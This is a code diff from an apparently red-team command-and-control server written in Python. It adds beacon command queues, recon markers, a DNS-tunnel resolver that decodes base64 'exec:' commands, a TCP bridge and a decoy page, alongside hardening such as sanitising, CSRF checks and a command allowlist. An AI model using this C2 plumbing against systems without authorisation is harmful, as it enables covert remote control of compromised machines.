-    with open('sessions/cves.json', 'w') as file:
+    with open("sessions/cves.json", "w") as file:
         json.dump(cves, file, indent=4)
-
 
 
 def create_report():
     if not os.path.exists(JSON_FILE_PATH_REPORT):
-        with open(JSON_FILE_PATH_REPORT, 'w') as json_file:
+        with open(JSON_FILE_PATH_REPORT, "w") as json_file:
             return json.dump({}, json_file)
 
+
 def save_tasks(tasks):
-    with open('sessions/tasks.json', 'w') as file:
+    with open("sessions/tasks.json", "w") as file:
         json.dump(tasks, file, indent=4)
 
 
 def load_note():
-    file_path = 'sessions/notes.txt'
+    file_path = "sessions/notes.txt"
     if not os.path.exists(file_path):
-        with open(file_path, 'w') as file:
+        with open(file_path, "w") as file:
             file.write(json.dumps({"content": ""}))
 
-    with open(file_path, 'r') as file:
+    with open(file_path, "r") as file:
         notes = file.read().strip()
 
     if not notes:
@@ -956,67 +1115,94 @@ def load_note():
     except json.JSONDecodeError:
         return {"content": ""}
 
+
 def aumentar_elo(user_id, cantidad):
+    if _RBAC_AVAILABLE:
+        store = get_rbac_store()
+        user = store.find_by_id(user_id)
+        if user:
+            user.elo += cantidad
+            store.save(user)
+            logger.info(f"The Elo of user {user.username} Increased in {user.elo}.")
+        else:
+            logger.info(f"User ID {user_id} not found.")
+        return
+
     if os.path.exists(USER_DATA_PATH):
-        with open(USER_DATA_PATH, 'r') as file:
+        with open(USER_DATA_PATH, "r") as file:
             users = json.load(file)
     else:
         users = []
 
-    usuario = next((user for user in users if user['id'] == user_id), None)
+    usuario = next((user for user in users if user["id"] == user_id), None)
 
     if usuario:
-
-        usuario['elo'] += cantidad
+        usuario["elo"] += cantidad
         logger.info(f"The Elo of user {usuario['username']} Increased in {usuario['elo']}.")
 
-        with open(USER_DATA_PATH, 'w') as file:
+        with open(USER_DATA_PATH, "w") as file:
             json.dump(users, file, indent=4)
     else:
         logger.info(f"User ID {user_id} not found.")
 
+
 def save_note(content):
-    file_path = 'sessions/notes.txt'
-    with open(file_path, 'w') as file:
+    file_path = "sessions/notes.txt"
+    with open(file_path, "w") as file:
         file.write(json.dumps({"content": content}))
+
 
 def escape_js(s):
     return json.dumps(s)[1:-1]
 
-_ALLOWED_TAGS = ('p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'code', 'pre',
-                 'blockquote', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'a')
+
+_ALLOWED_TAGS = (
+    "p",
+    "br",
+    "strong",
+    "em",
+    "ul",
+    "ol",
+    "li",
+    "code",
+    "pre",
+    "blockquote",
+    "h1",
+    "h2",
+    "h3",
+    "h4",
+    "h5",
+    "h6",
+    "a",
+)
 
 
 def _sanitize_html(raw_html):
-    """Sanitize HTML by stripping dangerous tags and event handlers."""
-    if not raw_html:
-        return ""
-    raw_html = re.sub(r'<(script|style)[^>]*>.*?</\1>', '', raw_html,
-                      flags=re.DOTALL | re.IGNORECASE)
-    raw_html = re.sub(r'on\w+\s*=\s*["\'][^"\']*["\']', '', raw_html,
-                      flags=re.IGNORECASE)
-    raw_html = re.sub(r'javascript:', '', raw_html, flags=re.IGNORECASE)
-    escaped = html.escape(raw_html)
-    for tag in _ALLOWED_TAGS:
-        escaped = re.sub(r'&lt;(' + tag + r')\s*(.*?)&gt;',
-                         r'<\1\2>', escaped, flags=re.IGNORECASE)
-        escaped = re.sub(r'&lt;/(' + tag + r')&gt;',
-                         r'</\1>', escaped, flags=re.IGNORECASE)
-    return escaped
+    """Sanitize HTML by stripping dangerous tags and event handlers.
+
+    The implementation delegates to
+    :func:`lazyc2.security.html_sanitizer.sanitize_html`, which is
+    backed by ``bleach`` and the constants in
+    :mod:`lazyc2.security.constants`. The legacy regex-based
+    implementation lived in this module but is no longer used.
+    """
+    return _lazyc2_sanitize_html(raw_html)
 
 
 def markdown_to_html(text):
     if text:
-        text_with_br = text.replace('\n', '<br />')
-        html_content = markdown.markdown(text_with_br, extensions=['extra'])
+        text_with_br = text.replace("\n", "<br />")
+        html_content = markdown.markdown(text_with_br, extensions=["extra"])
         return _sanitize_html(html_content)
     return escape_js("")
+
 
 def to_serializable(obj):
     """Convert objects to serializable format."""
     if isinstance(obj, (list, dict, str, int, float, bool, type(None))):
         return obj
     return str(obj)
+
 
 def make_serializable(data):
     """Recursively convert data to serializable format."""
@@ -1027,36 +1213,290 @@ def make_serializable(data):
     else:
         return to_serializable(data)
 
+
 def _sanitize_csv_field(value: str, maxlen: int = 1000) -> str:
     """Prevent CSV injection by prefixing formula-starting values."""
     value = str(value)[:maxlen]
-    if value and value[0] in ('=', '+', '-', '@', '\t', '\r', '\n'):
+    if value and value[0] in ("=", "+", "-", "@", "\t", "\r", "\n"):
         value = "'" + value
     return value
+
+
+def datetime_now_iso() -> str:
+    """Return the current UTC timestamp as an ISO-8601 string."""
+    return datetime.now(timezone.utc).isoformat()
+
+
+def _secure_command_queue_path(client_id: str) -> str:
+    """Return a sanitised, path-confined command queue file path for a beacon.
+
+    Sanitises the client_id, builds the queue path relative to ALLOWED_DIRECTORY,
+    and verifies via os.path.realpath that the resolved path does not escape the
+    allowed base directory.
+
+    Args:
+        client_id: Raw beacon id from the request.
+
+    Returns:
+        The validated absolute real path to the cmd_<safe_id>.json queue file.
+
+    Raises:
+        ValueError: If the sanitised client_id is empty or the resolved path
+            escapes the allowed directory.
+    """
+    from modules.beacon_history import sanitize_client_id
+
+    safe_id = sanitize_client_id(client_id)
+    if not safe_id:
+        raise ValueError(f"Invalid client_id after sanitization: {client_id}")
+    candidate = os.path.join(ALLOWED_DIRECTORY, f"cmd_{safe_id}.json")
+    resolved = os.path.realpath(candidate)
+    allowed = os.path.realpath(ALLOWED_DIRECTORY)
+    if not resolved.startswith(allowed + os.sep):
+        raise ValueError(f"Queue path escapes allowed directory: {resolved}")
+    return resolved
+
+
+def _beacon_records_path(client_id: str) -> str:
+    """Return the JSONL history file path for a sanitised beacon client id."""
+    from modules.beacon_history import sanitize_client_id
+
+    return os.path.join(ALLOWED_DIRECTORY, "sessions", f"{sanitize_client_id(client_id)}{'.records.jsonl'}")
+
+
+_RECON_STATE_FILENAME = "recon_state.json"
+
+
+def _malleable_recon_state_dir(client_id: str) -> tuple[str, str]:
+    """Resolve the bounded recon-state directory and marker path.
+
+    Args:
+        client_id: Sanitised beacon identifier.
+
+    Returns:
+        ``(state_dir, marker_path)`` where ``state_dir`` is a
+        ``sessions/<safe_id>/c2`` subdirectory and ``marker_path`` points
+        to ``recon_state.json`` inside it.
+
+    Raises:
+        ValueError: If the sanitised client_id is empty or the resolved
+            marker path escapes the allowed directory.
+    """
+    from modules.beacon_history import sanitize_client_id
+
+    safe_id = sanitize_client_id(client_id)
+    if not safe_id:
+        raise ValueError(f"Invalid client_id after sanitization: {client_id}")
+    state_dir = os.path.join(ALLOWED_DIRECTORY, "sessions", safe_id, "c2")
+    marker = os.path.realpath(os.path.join(state_dir, _RECON_STATE_FILENAME))
+    allowed = os.path.realpath(ALLOWED_DIRECTORY)
+    if not marker.startswith(allowed + os.sep):
+        raise ValueError(f"Recon state path escapes allowed directory: {marker}")
+    return state_dir, marker
+
+
+def _load_malleable_recon_state(client_id: str) -> dict:
+    """Load the per-beacon malleable recon markers (discover/portscan).
+
+    Args:
+        client_id: Beacon identifier.
+
+    Returns:
+        The stored marker dict, or an empty dict when unavailable.
+    """
+    try:
+        _state_dir, marker = _malleable_recon_state_dir(client_id)
+        if os.path.isfile(marker):
+            with open(marker, encoding="utf-8") as handle:
+                data = json.load(handle)
+                if isinstance(data, dict):
+                    return data
+    except (OSError, json.JSONDecodeError, ValueError) as exc:
+        logging.debug("[beacon_recon] markers load failed: %s", exc)
+    return {}
+
+
+def _save_malleable_recon_state(client_id: str, state: dict) -> bool:
+    """Persist the per-beacon malleable recon markers.
+
+    Args:
+        client_id: Beacon identifier.
+        state: Marker dict (``discover_queued``, ``portscan_queued``).
+
+    Returns:
+        True when the marker file was written.
+    """
+    try:
+        state_dir, marker = _malleable_recon_state_dir(client_id)
+        os.makedirs(state_dir, exist_ok=True)
+        with open(marker, "w", encoding="utf-8") as handle:
+            json.dump(state, handle)
+        return True
+    except (OSError, ValueError) as exc:
+        logging.debug("[beacon_recon] markers save failed: %s", exc)
+        return False
+
+
+def _enqueue_malleable_command(client_id: str, command: str) -> bool:
+    """Append one command to a beacon queue file (crosses process boundary).
+
+    Args:
+        client_id: Beacon identifier.
+        command: Malleable command payload, e.g. ``"portscan:"``.
+
+    Returns:
+        True when the queue file was written.
+    """
+    try:
+        queue_path = _secure_command_queue_path(client_id)
+        os.makedirs(os.path.dirname(queue_path), exist_ok=True)
+        _cmds: list = []
+        if os.path.isfile(queue_path):
+            with open(queue_path, encoding="utf-8") as handle:
+                _cmds = json.load(handle)
+        if not isinstance(_cmds, list):
+            _cmds = []
+        _cmds.append(command)
+        with open(queue_path, "w", encoding="utf-8") as handle:
+            json.dump(_cmds, handle)
+        return True
+    except (OSError, json.JSONDecodeError, ValueError) as exc:
+        logging.debug("[beacon_recon] queue append failed: %s", exc)
+        return False
+
+
+def _append_beacon_record(record: dict) -> bool:
+    """Append one beacon result record to the persistent JSONL history.
+
+    Keeps the full command/result timeline for a beacon so both the Flask
+    GUI and GUI2 can replay history instead of only the latest result.
+
+    Args:
+        record: The normalised beacon record dict (already sanitised).
+
+    Returns:
+        True when the append succeeded, False otherwise.
+    """
+    cid = str(record.get("client_id", ""))
+    if not cid:
+        return False
+    try:
+        from modules.beacon_history import append_record
+
+        return append_record(record)
+    except Exception:
+        try:
+            safe = _beacon_records_path(cid)
+            os.makedirs(os.path.dirname(safe), exist_ok=True)
+            with open(safe, "a", encoding="utf-8") as fh:
+                fh.write(json.dumps(record, ensure_ascii=False) + "\n")
+            return True
+        except Exception:
+            return False
+
+
+def _read_beacon_records(client_id: str) -> list[dict]:
+    """Read the ordered JSONL history for a sanitised beacon client id.
+
+    Args:
+        client_id: The beacon id used to locate its history file.
+
+    Returns:
+        A list of record dicts in chronological order (oldest first).
+    """
+    try:
+        from modules.beacon_history import read_records
+
+        return read_records(client_id)
+    except Exception:
+        path = _beacon_records_path(client_id)
+        records: list[dict] = []
+        if not os.path.isfile(path):
+            return records
+        try:
+            with open(path, "r", encoding="utf-8") as fh:
+                for line in fh:
+                    line = line.strip()
+                    if not line:
+                        continue
+                    try:
+                        records.append(json.loads(line))
+                    except json.JSONDecodeError:
+                        continue
+        except Exception:
+            pass
+        return records
+    try:
+        with open(path, "r", encoding="utf-8") as fh:
+            for line in fh:
+                line = line.strip()
+                if not line:
+                    continue
+                try:
+                    records.append(json.loads(line))
+                except json.JSONDecodeError:
+                    continue
+    except Exception as exc:
+        logging.warning("[c2] beacon history read failed: %s", exc)
+    return records
+
 
 def escape_js_string(value):
     """Escape special characters in a string for JavaScript."""
     if isinstance(value, str):
-        value = re.sub(r'([\\"\'])', r'\\\1', value)
-        value = re.sub(r'\n', r'\\n', value)
-        value = re.sub(r'\r', r'\\r', value)
+        value = re.sub(r'([\\"\'])', r"\\\1", value)
+        value = re.sub(r"\n", r"\\n", value)
+        value = re.sub(r"\r", r"\\r", value)
     return value
 
-def strip_ansi(s):
-    ansi_regex = re.compile(r'[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]')
-    return ansi_regex.sub('', s)
 
-def check_auth(username, password):
-    """Verifica si el usuario y contraseña son correctos"""
-    return username == USERNAME and password == PASSWORD
+from core.parsers import strip_ansi  # noqa: E402
+
+
+def check_auth(username: str, password: str) -> bool:
+    """Verify credentials. Checks RBACStore first, falls back to CLI creds."""
+    if not username or not password:
+        return False
+    if _RBAC_AVAILABLE:
+        store = get_rbac_store()
+        user = store.find_by_username(username)
+        if user and check_password_hash(user.password_hash, password):
+            return True
+        if hmac.compare_digest(username, USERNAME) and hmac.compare_digest(password, PASSWORD):
+            return True
+        return False
+    return hmac.compare_digest(username, USERNAME) and hmac.compare_digest(password, PASSWORD)
+
 
 def authenticate():
-    """Solicita autenticación"""
+    """Requests authentication."""
     return Response(
-        'Invalid credentials. Please provide valid username and password.\n',
+        "Invalid credentials. Please provide valid username and password.\n",
         401,
-        {'WWW-Authenticate': 'Basic realm="Login Required"'}
+        {"WWW-Authenticate": 'Basic realm="Login Required"'},
     )
+
+
+def requires_auth_or_session(f):
+    """Require Basic auth credentials or a valid Flask-Login session.
+
+    Used on endpoints that are driven both by the CLI (which sends HTTP
+    Basic credentials) and by the GUI dashboard deep the operator has
+    already authenticated through ``/login`` (session cookie). Either
+    channel satisfies the gate.
+    """
+
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        auth = request.authorization
+        if auth and check_auth(auth.username, auth.password):
+            return f(*args, **kwargs)
+        if current_user.is_authenticated:
+            return f(*args, **kwargs)
+        return authenticate()
+
+    return decorated
+
 
 def requires_auth(f):
     @wraps(f)
@@ -1065,10 +1505,33 @@ def requires_auth(f):
         if not auth or not check_auth(auth.username, auth.password):
             return authenticate()
         return f(*args, **kwargs)
+
     return decorated
 
+
+def csrf_protect(view):
+    """Decorator that enforces the per-session CSRF token.
+
+    The CSRF policy is the module-level :data:`_csrf_policy`. When the
+    payload key ``c2_csrf_enabled`` is ``False`` the decorator is a
+    no-op so existing operators can disable the gate without touching
+    the codebase.
+    """
+
+    @wraps(view)
+    def wrapper(*args, **kwargs):
+        if not bool(getattr(config, "c2_csrf_enabled", True)):
+            return view(*args, **kwargs)
+        session_id = request.cookies.get(_csrf_policy.cookie_name) or request.headers.get("X-Session-Id", "")
+        if not _csrf_policy.check_request(session_id, request):
+            return jsonify({"error": "csrf token missing or invalid"}), 403
+        return view(*args, **kwargs)
+
+    return wrapper
+
+
 def aicmd_deepseek(cmd):
-    if cmd == 'ping':
+    if cmd == "ping":
         ping = shell.one_cmd("ping")
         ping = strip_ansi(ping)
         return ping
@@ -1090,7 +1553,7 @@ def aicmd_deepseek(cmd):
                 "func_desc": "send a spider to web scrap a host or url",
                 "command_desc": "The command to webscaping with gospider to the target",
             }
-        }
+        },
     ]
     command_info = None
     for command in commands:
@@ -1105,17 +1568,14 @@ def aicmd_deepseek(cmd):
         return "AI features disabled: set 'api_key' in payload.json to enable Groq-backed commands"
 
     messages = [
-        {
-            "role": "system",
-            "content": command_info["content_system"]
-        },
+        {"role": "system", "content": command_info["content_system"]},
         {
             "role": "user",
             "content": command_info["content_user"],
-        }
+        },
     ]
 
-    tools = [
+    [
         {
             "type": "function",
             "function": {
@@ -1138,11 +1598,7 @@ def aicmd_deepseek(cmd):
     logging.info("Sending request to DeepSeek")
     response = requests.post(
         "http://localhost:11434/api/generate",
-        json={
-            "model": "deepseek-r1:1.5b",
-            "prompt": json.dumps(messages),
-            "stream": False
-        }
+        json={"model": "deepseek-r1:1.5b", "prompt": json.dumps(messages), "stream": False},
     )
 
     if response.status_code == 200:
@@ -1159,11 +1615,9 @@ def aicmd_deepseek(cmd):
             for tool_call in tool_calls:
                 function_name = tool_call["function"]["name"]
                 function_to_call = available_functions[function_name]
-                function_args = json.loads(tool_call["function"]["arguments"])
+                json.loads(tool_call["function"]["arguments"])
 
-                function_response = function_to_call(
-                    command=cmd_string
-                )
+                function_response = function_to_call(command=cmd_string)
 
                 messages.append(
                     {
@@ -1176,11 +1630,7 @@ def aicmd_deepseek(cmd):
 
             second_response = requests.post(
                 "http://localhost:11434/api/generate",
-                json={
-                    "model": "deepseek-r1:1.5b",
-                    "prompt": json.dumps(messages),
-                    "stream": False
-                }
+                json={"model": "deepseek-r1:1.5b", "prompt": json.dumps(messages), "stream": False},
             )
 
             if second_response.status_code == 200:
@@ -1193,12 +1643,12 @@ def aicmd_deepseek(cmd):
     else:
         return f"Error in first request: {response.status_code}"
 
-def aicmd(cmd):
-    #if cmd == 'ping':
-    #ping = shell.one_cmd("ping")
-    #ping = strip_ansi(ping)
-    #return ping
 
+def aicmd(cmd):
+    # if cmd == 'ping':
+    # ping = shell.one_cmd("ping")
+    # ping = strip_ansi(ping)
+    # return ping
 
     cmd_string = cmd
     commands = [
@@ -1217,7 +1667,7 @@ def aicmd(cmd):
                 "func_desc": "send a spider to web scrap a host or url",
                 "command_desc": "The command to webscaping with gospider to the target",
             }
-        }
+        },
     ]
     command_info = None
     for command in commands:
@@ -1232,14 +1682,11 @@ def aicmd(cmd):
         return "AI features disabled: set 'api_key' in payload.json to enable Groq-backed commands"
 
     messages = [
-        {
-            "role": "system",
-            "content": command_info["content_system"]
-        },
+        {"role": "system", "content": command_info["content_system"]},
         {
             "role": "user",
             "content": command_info["content_user"],
-        }
+        },
     ]
 
     tools = [
@@ -1283,11 +1730,9 @@ def aicmd(cmd):
         for tool_call in tool_calls:
             function_name = tool_call.function.name
             function_to_call = available_functions[function_name]
-            function_args = json.loads(tool_call.function.arguments)
+            json.loads(tool_call.function.arguments)
 
-            function_response = function_to_call(
-                command=cmd_string
-            )
+            function_response = function_to_call(command=cmd_string)
 
             messages.append(
                 {
@@ -1298,18 +1743,20 @@ def aicmd(cmd):
                 }
             )
 
-        second_response = client.chat.completions.create(
-            model=MODEL,
-            messages=messages
-        )
+        second_response = client.chat.completions.create(model=MODEL, messages=messages)
 
         response_bot = second_response.choices[0].message.content
         return response_bot
+
 
 def search_database(term, data_path="parquets/techniques.parquet"):
     """
     Busca un término en un DataFrame, manejando listas, dicts y distintas estructuras.
     """
+    try:
+        import pandas as pd
+    except ImportError:
+        return "\n# Error\n- **Detail**: pandas is not installed (light profile). Install it for parquet search.\n"
     try:
         df = pd.read_parquet(data_path)
     except Exception as e:
@@ -1317,13 +1764,13 @@ def search_database(term, data_path="parquets/techniques.parquet"):
         return "\n# Error\n- **Detail**: Failed to load knowledge base. Check server logs.\n"
 
     # Normalizar nombres de binarios (quitar .exe, espacios, etc.)
-    if 'Binary' in df.columns:
-        df['Binary'] = df['Binary'].astype(str).str.replace(r'\.exe$', '', case=False, regex=True).str.strip()
+    if "Binary" in df.columns:
+        df["Binary"] = df["Binary"].astype(str).str.replace(r"\.exe$", "", case=False, regex=True).str.strip()
 
     # Aplanar listas
     for col in df.columns:
         if df[col].apply(lambda x: isinstance(x, list)).any():
-            df[col] = df[col].apply(lambda x: ', '.join(map(str, x)) if isinstance(x, list) else x)
+            df[col] = df[col].apply(lambda x: ", ".join(map(str, x)) if isinstance(x, list) else x)
 
     # Aplanar diccionarios (structs)
     struct_cols = [col for col in df.columns if df[col].apply(lambda x: isinstance(x, dict)).any()]
@@ -1340,14 +1787,14 @@ def search_database(term, data_path="parquets/techniques.parquet"):
     if not results.empty:
         for _, row in results.iterrows():
             # Intentar usar nombres comunes
-            binary = row.get('Binary', 'Unknown')
-            func_name = row.get('Function Name', row.get('function-name', 'N/A'))
-            example = row.get('Example', row.get('example', 'Not available'))
+            binary = row.get("Binary", "Unknown")
+            func_name = row.get("Function Name", row.get("function-name", "N/A"))
+            example = row.get("Example", row.get("example", "Not available"))
 
             md_content += f"\n## {binary} - {func_name}\n"
             md_content += f"- **Source**: `{data_path.split('/')[-1]}`\n"
             for key, value in row.items():
-                if pd.isna(value) or value == "" or key in ['Binary', 'Function Name', 'Example']:
+                if pd.isna(value) or value == "" or key in ["Binary", "Function Name", "Example"]:
                     continue
                 md_content += f"- **{key}**: `{value}`\n"
             md_content += f"\n**Example**:\n```\n{example}\n```\n\n---\n"
@@ -1359,66 +1806,59 @@ def search_database(term, data_path="parquets/techniques.parquet"):
 
 def execute_command(command):
     try:
+        import shlex
+
+        argv = shlex.split(command)
         result = subprocess.run(
-            command,
-            shell=True,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True,
-            timeout=10
+            argv, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=10
         )
         return result.stdout + result.stderr
-    except Exception as e:
+    except Exception:
         return str("audio")
+
+
+_DNS_COMMAND_ALLOWLIST = frozenset(
+    {
+        "status",
+        "whoami",
+        "ip",
+        "hostname",
+        "uptime",
+        "ls",
+        "pwd",
+        "cat /etc/hostname",
+    }
+)
+
+_DNS_MAX_DECODED_LENGTH = 256
+
 
 class CustomDNSResolver(BaseResolver):
     def resolve(self, request, handler):
         reply = request.reply()
         qname = str(request.q.qname)
         qtype = request.q.qtype
-
+        lhost = getattr(config, "lhost", "127.0.0.1")
 
         logger.info(f"Consulta recibida: {qname} (Tipo: {QTYPE[qtype]})")
 
-
-        subdomain = qname.replace(".c2.lazyown.org.", "").rstrip('.')
-
+        subdomain = qname.replace(".c2.lazyown.org.", "").rstrip(".")
 
         subdomain_responses = {
-            "info.esporalibre.cl.": {
-                QTYPE.A: A("192.168.1.98"),
-                QTYPE.TXT: TXT("Información sobre esporalibre.cl")
-            },
-            "mail.esporalibre.cl.": {
-                QTYPE.A: A("192.168.1.98"),
-                QTYPE.MX: MX("mail.esporalibre.cl.")
-            },
-            "www.esporalibre.cl.": {
-                QTYPE.A: A("192.168.1.98"),
-                QTYPE.CNAME: CNAME("esporalibre.cl.")
-            },
-            "ns.esporalibre.cl.": {
-                QTYPE.NS: NS("ns.esporalibre.cl.")
-            },
+            "info.esporalibre.cl.": {QTYPE.A: A(lhost), QTYPE.TXT: TXT("Información sobre esporalibre.cl")},
+            "mail.esporalibre.cl.": {QTYPE.A: A(lhost), QTYPE.MX: MX("mail.esporalibre.cl.")},
+            "www.esporalibre.cl.": {QTYPE.A: A(lhost), QTYPE.CNAME: CNAME("esporalibre.cl.")},
+            "ns.esporalibre.cl.": {QTYPE.NS: NS("ns.esporalibre.cl.")},
             "esporalibre.cl.": {
-                QTYPE.SOA: SOA(
-                    "ns.esporalibre.cl.",
-                    "admin.esporalibre.cl.",
-                    (1, 3600, 600, 86400, 3600)
-                ),
+                QTYPE.SOA: SOA("ns.esporalibre.cl.", "admin.esporalibre.cl.", (1, 3600, 600, 86400, 3600)),
                 QTYPE.MX: MX("mail.esporalibre.cl."),
                 QTYPE.TXT: TXT("v=spf1 include:_spf.google.com ~all"),
                 QTYPE.CAA: CAA(0, "issue", "letsencrypt.org"),
                 QTYPE.TLSA: TLSA(1, 1, 1, b"your_tlsa_data"),
-                QTYPE.SSHFP: SSHFP(1, 1, b"your_sshfp_data")
+                QTYPE.SSHFP: SSHFP(1, 1, b"your_sshfp_data"),
             },
-
-            "c2.lazyown.org.": {
-                QTYPE.A: A("127.0.0.1"),
-                QTYPE.TXT: TXT("Servidor C2 activo")
-            }
+            "c2.lazyown.org.": {QTYPE.A: A("127.0.0.1"), QTYPE.TXT: TXT("Servidor C2 activo")},
         }
-
 
         if qname in subdomain_responses:
             if qtype in subdomain_responses[qname]:
@@ -1428,31 +1868,36 @@ class CustomDNSResolver(BaseResolver):
                 reply.header.rcode = 3
                 logger.warning(f"Tipo de consulta no soportado para {qname}: {QTYPE[qtype]}")
         else:
-
             if qname.endswith("c2.lazyown.org."):
                 try:
-
-                    command = base64.urlsafe_b64decode(subdomain + "==").decode('utf-8')
+                    command = base64.urlsafe_b64decode(subdomain + "==").decode("utf-8")
                     logger.info(f"Comando recibido: {command}")
 
-
-                    if command.startswith("exec:"):
-                        output = f"Ejecutado: {command[5:]}"
-                        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(output), ttl=60))
-                        logger.info(f"Respuesta enviada: {output}")
+                    if len(command) > _DNS_MAX_DECODED_LENGTH:
+                        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("Command too long"), ttl=60))
+                        logger.warning(f"DNS command rejected: length {len(command)} exceeds limit")
+                    elif command.startswith("exec:"):
+                        exec_payload = command[5:]
+                        if exec_payload not in _DNS_COMMAND_ALLOWLIST:
+                            reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("Command not allowed"), ttl=60))
+                            logger.warning(f"DNS command not in allowlist: {exec_payload}")
+                        else:
+                            output = f"Ejecutado: {exec_payload}"
+                            reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(output), ttl=60))
+                            logger.info(f"Respuesta enviada: {output}")
                     else:
                         reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("Comando no reconocido"), ttl=60))
                         logger.warning(f"Comando no reconocido: {command}")
 
-                except Exception as e:
-                    logger.error(f"Error:")
+                except Exception:
+                    logger.error("Error:")
                     reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("Error en el comando"), ttl=60))
             else:
-
                 reply.header.rcode = 3
                 logger.warning(f"Dominio no reconocido: {qname}")
 
         return reply
+
 
 def _log_dns_bind_failure(address: str, error_number: int | None) -> None:
     """Emit a single structured log line describing why DNS could not bind.
@@ -1470,7 +1915,8 @@ def _log_dns_bind_failure(address: str, error_number: int | None) -> None:
     if error_number == errno.EACCES:
         logger.error(
             "C2 DNS server not started: binding %s:%d requires CAP_NET_BIND_SERVICE or root",
-            address, _C2_DNS_PORT,
+            address,
+            _C2_DNS_PORT,
         )
     elif error_number == errno.EADDRNOTAVAIL:
         logger.error(
@@ -1480,12 +1926,15 @@ def _log_dns_bind_failure(address: str, error_number: int | None) -> None:
     elif error_number == errno.EADDRINUSE:
         logger.error(
             "C2 DNS server not started: %s:%d already in use",
-            address, _C2_DNS_PORT,
+            address,
+            _C2_DNS_PORT,
         )
     else:
         logger.error(
             "C2 DNS server not started: cannot bind %s:%d (errno=%s)",
-            address, _C2_DNS_PORT, error_number,
+            address,
+            _C2_DNS_PORT,
+            error_number,
         )
 
 
@@ -1528,6 +1977,7 @@ def start_dns_server() -> None:
     except Exception:
         logger.exception("C2 DNS server crashed unexpectedly")
 
+
 def tcp_bridge(local_port, remote_host, remote_port):
     """Establish a TCP bridge between a local port and a remote host."""
     resolved = _resolve_bind_address(port=local_port)
@@ -1551,13 +2001,13 @@ def tcp_bridge(local_port, remote_host, remote_port):
 
         threading.Thread(target=handle_client, args=(client_socket, remote_host, remote_port)).start()
 
+
 def handle_client(client_socket, remote_host, remote_port):
     """Handle communication between the client and the remote server."""
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
         server_socket.connect((remote_host, remote_port))
 
         while True:
-
             client_data = client_socket.recv(4096)
             if not client_data:
                 break
@@ -1570,37 +2020,91 @@ def handle_client(client_socket, remote_host, remote_port):
 
     client_socket.close()
 
+
 def decoy():
+    """Serve a decoy page to non-operator IPs when decoy mode is enabled.
+
+    Behaviour is driven by ``c2_decoy_mode`` in payload.json:
+
+    - ``"off"``: disabled; every request proceeds to normal handling.
+    - ``"page"`` (default): requests from IPs outside the operator allowlist
+      receive a fake decoy page. This preserves the legacy honeypot look.
+    - ``"deny"``: requests from non-operator IPs receive HTTP 403 instead
+      of a misleading page. Use this when the decoy is not wanted.
+
+    The operator allowlist is ``lhost``, ``127.0.0.1`` and the entries of
+    ``c2_operator_ip_allowlist``.
+    """
+    mode = str(getattr(config, "c2_decoy_mode", "page") or "page").strip().lower()
+    if mode == "off":
+        return None
     client_ip = request.remote_addr
-    logging.info(f"[INFO]: IP {client_ip}")
-    if (client_ip != lhost) and (client_ip != '127.0.0.1'):
-        return render_template('decoy.html')
+    allowed_ips = {str(lhost), "127.0.0.1"}
+    allowed_ips.update(
+        ip.strip()
+        for ip in str(getattr(config, "c2_operator_ip_allowlist", "127.0.0.1") or "127.0.0.1")
+        .replace("{lhost}", str(getattr(config, "lhost", "127.0.0.1")))
+        .split(",")
+        if ip.strip()
+    )
+    if client_ip not in allowed_ips:
+        logging.warning(
+            "[decoy] Request from non-operator IP %s served decoy (%s mode)",
+            client_ip,
+            mode,
+        )
+        if mode == "deny":
+            abort(403, description="Access denied")
+        return render_template("decoy.html")
     return None
+
+
+def _current_aes_key():
+    """Return the on-disk AES key, reloading it when it changed.
+
+    Key rotation can happen out of process (``clean``, a fresh C2 boot
+    while the dashboard lives on); beacons always encrypt with the file
+    the latest writer produced, so the reader must follow the file too.
+    """
+    global AES_KEY
+    try:
+        key_bytes = _AES_KEY_PATH.read_bytes()
+        if len(key_bytes) != AES_KEY_SIZE_BYTES:
+            return AES_KEY
+        if key_bytes != AES_KEY:
+            AES_KEY = key_bytes
+        return AES_KEY
+    except OSError:
+        return AES_KEY
+
 
 def encrypt_data(data):
     iv = os.urandom(16)
-    cipher = Cipher(algorithms.AES(AES_KEY), modes.CFB(iv), backend=default_backend())
+    cipher = Cipher(algorithms.AES(_current_aes_key()), modes.CFB(iv), backend=default_backend())
     encryptor = cipher.encryptor()
     encrypted_data = encryptor.update(data) + encryptor.finalize()
     combined = iv + encrypted_data
-    return base64.b64encode(combined).decode('utf-8')
+    return base64.b64encode(combined).decode("utf-8")
 
-def decrypt_data(encrypted_data, is_file = False):
+
+def decrypt_data(encrypted_data, is_file=False):
     encrypted_data = base64.b64decode(encrypted_data)
     iv = encrypted_data[:16]
     encrypted_data = encrypted_data[16:]
-    cipher = Cipher(algorithms.AES(AES_KEY), modes.CFB(iv), backend=default_backend())
+    cipher = Cipher(algorithms.AES(_current_aes_key()), modes.CFB(iv), backend=default_backend())
     decryptor = cipher.decryptor()
     decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
     if is_file:
         return decrypted_data
     else:
-        return decrypted_data.decode('utf-8')
+        return decrypted_data.decode("utf-8")
+
 
 def set_winsize(fd, row, col, xpix=0, ypix=0):
     """Configura el tamaño de la terminal"""
     winsize = struct.pack("HHHH", row, col, xpix, ypix)
     fcntl.ioctl(fd, termios.TIOCSWINSZ, winsize)
+
 
 def read_and_forward_pty_output():
     """Lectura continua del PTY y envío por WebSocket"""
@@ -1615,31 +2119,21 @@ def read_and_forward_pty_output():
                     output = os.read(app.config["fd"], max_read_bytes)
                     if output:
                         socketio.emit("pty-output", {"output": output.decode(errors="replace")}, namespace="/pty")
-            except Exception as e:
-                logger.error(f"Error leyendo salida:")
+            except Exception:
+                logger.error("Error leyendo salida:")
 
-def read_and_forward_pty_output_c2():
